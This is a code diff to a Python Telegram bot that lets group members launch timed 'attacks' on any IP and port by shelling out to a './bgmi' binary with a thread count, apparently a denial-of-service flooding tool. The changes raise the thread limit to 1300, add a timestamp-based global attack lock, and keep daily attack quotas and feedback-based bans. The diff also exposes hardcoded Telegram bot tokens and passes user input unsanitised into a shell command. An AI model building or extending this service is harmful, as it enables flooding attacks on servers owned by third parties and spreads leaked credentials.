@@ -1,6 +1,7 @@
 import os
 import asyncio
 import logging
+import time
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
 
@@ -15,18 +16,20 @@ logging.basicConfig(
 )
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '7623380258:AAHtmKVKzNvumZyU0-GdOZ2WJ3a5XJSeMxw'  # Replace with your bot token
+TELEGRAM_BOT_TOKEN = '8146585403:AAFJYRvEErZ9NuZ9ufyf8cvXyWOzs0lIB4k'  # Replace with your bot token
 OWNER_USERNAME = "Riyahacksyt"  # Replace with your Telegram username (without @)
-ALLOWED_GROUP_ID = -1002283210199  # Replace with your allowed group ID
-MAX_THREADS = 1000  # Default max threads
+ALLOWED_GROUP_ID = -1002491572572  # Replace with your allowed group ID
+MAX_THREADS = 1300  # Default max threads
 max_duration = 180  # Default max attack duration
 daily_attack_limit = 8
 
 # Attack & Feedback System
-attack_running = False
 user_attacks = {}
 feedback_waiting = {}
 attack_ban_list = {}
+
+# Global attack lock (timestamp when the current attack finishes)
+global_attack_lock = 0  
 
 # Check if bot is used in the allowed group
 def is_allowed_group(update: Update):
@@ -53,7 +56,7 @@ async def start(update: Update, context: CallbackContext):
 
 # Attack Command
 async def attack(update: Update, context: CallbackContext):
-    global attack_running
+    global global_attack_lock
     if not is_allowed_group(update):
         return
 
@@ -63,7 +66,8 @@ async def attack(update: Update, context: CallbackContext):
         await update.message.reply_text("❌ *You are banned from using the attack command for 10 minutes!*", parse_mode='Markdown')
         return
 
-    if attack_running:
+    current_time = time.time()
+    if current_time < global_attack_lock:
         await update.message.reply_text("⚠️ *Please wait! Another attack is already running.*", parse_mode='Markdown')
         return
 
@@ -91,7 +95,9 @@ async def attack(update: Update, context: CallbackContext):
         await update.message.reply_text(f"❌ *Number of threads exceeds the max limit ({MAX_THREADS})!*", parse_mode='Markdown')
         return
 
-    attack_running = True
+    # Set global attack lock
+    global_attack_lock = current_time + duration
+
     user_attacks[user_id] -= 1
     remaining_attacks = user_attacks[user_id]
 
@@ -112,7 +118,6 @@ async def attack(update: Update, context: CallbackContext):
 
 # Run Attack in Background
 async def run_attack(chat_id, ip, port, duration, threads, context, user_id):
-    global attack_running
     try:
         process = await asyncio.create_subprocess_shell(
             f"./bgmi {ip} {port} {duration} {threads}",
@@ -131,7 +136,6 @@ async def run_attack(chat_id, ip, port, duration, threads, context, user_id):
         await context.bot.send_message(chat_id=chat_id, text="❌ *An error occurred during the attack!*", parse_mode='Markdown')
 
     finally:
-        attack_running = False
         if feedback_waiting.get(user_id):
             await context.bot.send_message(chat_id=chat_id, text=f"❌ *You didn't send feedback! You are banned from using the attack command for 10 minutes!*", parse_mode='Markdown')
             attack_ban_list[user_id] = True
